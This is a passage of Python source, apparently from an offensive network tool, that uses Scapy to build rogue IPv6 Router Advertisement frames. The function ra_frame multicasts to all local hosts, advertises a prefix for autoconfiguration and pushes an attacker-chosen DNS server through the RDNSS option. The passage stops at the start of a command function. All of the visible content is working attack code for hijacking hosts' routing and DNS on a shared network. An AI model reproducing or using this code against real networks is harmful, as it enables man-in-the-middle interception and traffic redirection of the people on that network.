# ---------------------------------------------------------------- roguera


def ra_frame(m, ll, rdns, prefix, lifetime):
    return (Ether(src=m, dst="33:33:00:00:00:01") /
            IPv6(src=ll, dst="ff02::1", hlim=255) /
            ICMPv6ND_RA(chlim=64, M=0, O=1, prf=1, routerlifetime=lifetime) /
            ICMPv6NDOptSrcLLAddr(lladdr=m) /
            ICMPv6NDOptPrefixInfo(prefixlen=64, L=1, A=1,
                                  validlifetime=86400,
                                  preferredlifetime=14400,
                                  prefix=prefix) /
            ICMPv6NDOptRDNSS(lifetime=lifetime * 3, dns=[rdns]))


def roguera_cmd(args):
